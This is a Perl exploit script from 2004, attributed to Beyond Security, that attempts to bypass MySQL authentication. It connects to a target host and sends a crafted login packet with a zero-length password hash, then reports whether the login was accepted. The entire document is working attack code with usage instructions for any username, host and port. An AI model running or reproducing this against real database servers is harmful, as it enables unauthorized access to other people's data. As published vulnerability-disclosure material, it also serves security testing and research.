#!/usr/bin/perl5.6.1
#
# The script connects to MySQL and attempts to log in using a zero-length password
# Based on the vuln found by NGSSecurity
#
# Exploit copyright (c) 2004 by Eli Kara, Beyond Security
# <elik@beyondsecurity.com>
#
use strict;
use IO::Socket;
my $dum0 = 0;
my $version = 0;
my $debug = 0;
#$SIG{ALRM} = sub {$dum0 = $dum0};
usage() unless ((@ARGV >= 1) || (@ARGV <= 3));

my $username = shift(@ARGV);
my $host = shift(@ARGV);
if (!$host)
{
  usage();
}
alarm  5;
my $port = shift(@ARGV);
if (!$port)
{
 $port = 3306; print "Using default MySQL port (3306)\n";
}

# create the socket
my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$host, PeerPort=>$port);
$socket or die "Cannot connect to host!\n";

# receive greeting
my $reply;
recv($socket, $reply, 1024, 0);
print "DBG $reply DBG\n";
if (length($reply) < 7 || $reply =~ /is not allowed to connect/)
{
 print "Not allowed to connect to MySQL!\n";
 exit(1);
}
($version, $dum0) = split(/-/, $reply);
($dum0, $version) = split(/\n/, $version);
print "VERSION $version\n";
print "Received greeting:\n" if $debug;
HexDump($reply) if $debug;
print "\n" if $debug;

# here we define the login OK reply
# my $login_ok = "\x01\x00\x00\x02\xFE";

# break the username string into chars and rebuild it
my $binuser = pack("C*", unpack("C*", $username));

# send login caps packet with password
my $packet = "\x85\xa6".
             "\x03\x00\x00".
    "\x00".
    "\x00\x01\x08\x00\x00\x00". # capabilities, max packet, etc..
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
             "\x00\x00\x00\x00".$binuser."\x00\x14\x00\x00\x00\x00". # username and pword hash length + NULL hash
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; # continue NULL hash

substr($packet, 0, 0) = pack("C1", length($packet)) . "\x00\x00\x01"; # MySQL message length + packet number (1)

print "Sending caps packet:\n" if $debug;
HexDump($packet) if $debug;
print "\n" if $debug;
send $socket, $packet, 0;

# receive reply
recv($socket, $reply, 1024, 0);
print "Received reply:\n" if $debug;
HexDump($reply) if $debug;

my @list_bytes = unpack("C*", $reply);

#print "The fifth byte is: ", $list_bytes[4], "\n";
if (length(@list_bytes) >= 4)
{
 print "Response insufficent\n";
}

#if ($reply eq $login_ok)
if ($list_bytes[4] == 0 || $list_bytes[4] == 254)
{
 print "Received OK reply, authentication successful!!\n";
}
else
{
 print "Authentication failed!\n";
}

# close
close($socket);

sub usage
{
    # print usage information
    print "\nUsage: mysql_auth_bypass_zeropass.pl <username> <host> [port]\n
<username> - The DB username to authenticate as
<host> - The host to connect to
[port] - The TCP port which MySQL is listening on (optional, default is 3306)\n\n";
    exit(1);
}


###
# do a hexdump of a string (assuming it's binary)
###
sub HexDump
{
 my $buffer = $_[0];

 # unpack it into chars
 my @up = unpack("C*", $buffer);
 my $pos=0;

 # calculate matrix sizes
 my $rows = int(@up/16);
 my $leftover = int(@up%16);

 for( my $row=0; $row < $rows ; $row++, $pos+=16)
 {
  printf("%08X\t", $pos);
  my @values = @up[$pos .. $pos+15];
  my @line;
  foreach my $val (@values)
  {
   push(@line, sprintf("%02X", $val));
  }
  print join(' ', @line), "\n";
 }
 # print last line
 printf("%08X\t", $pos);
 my @values = @up[$pos .. $pos+$leftover-1];
 my @line;
 foreach my $val (@values)
 {
  push(@line, sprintf("%02X", $val));
 }
 print join(' ', @line), "\n";
}
